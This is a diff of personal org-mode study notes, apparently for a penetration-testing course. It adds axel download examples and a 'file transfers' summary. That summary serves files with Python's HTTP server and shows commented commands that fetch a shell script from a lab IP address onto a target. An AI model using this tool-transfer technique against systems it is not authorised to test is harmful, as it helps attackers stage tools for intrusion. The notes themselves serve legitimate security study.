@@ -335,7 +335,12 @@ END   { print "\"<regex>\" appears in", n, "records." }' mail-list
     + ~curl -o report.pdf https://www.offensive-security.com/reports/penetration -testing-sample-report-2013.pdf~ 
 
 *** axel: FTP/HTTP/HTTPS download accelerator, use multiple connections
-    + ~axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/repor ts/penetration-testing-sample-report-2013.pdf~
+    + src:
+    #+begin_src sh
+axel -a -n 20 -o o.pdf https://example.com/o.pdf
+  # -a for alternate progress indicator
+  # -n for number of connections
+    #+end_src
 
 *** bash ENV variables: see ~man bash~
     + ~HISTCONTROL=ignoredups~
@@ -1503,6 +1508,14 @@ search -h                                     # help
 ** TODO lab c p467
    
 * Book3_Chapter 16 file transfers
+  
+** summary
+   + src:
+   #+begin_src sh
+python -m SimpleHTTPServer 80
+  # curl -o o.sh 10.10.0.1/o.sh
+  # axel -a -n 10 -o o.pdf 10.10.0.1/o.pdf
+   #+end_src
   
 ** Considerations and Preparations
 *** Dangers of Transferring Attack Tools
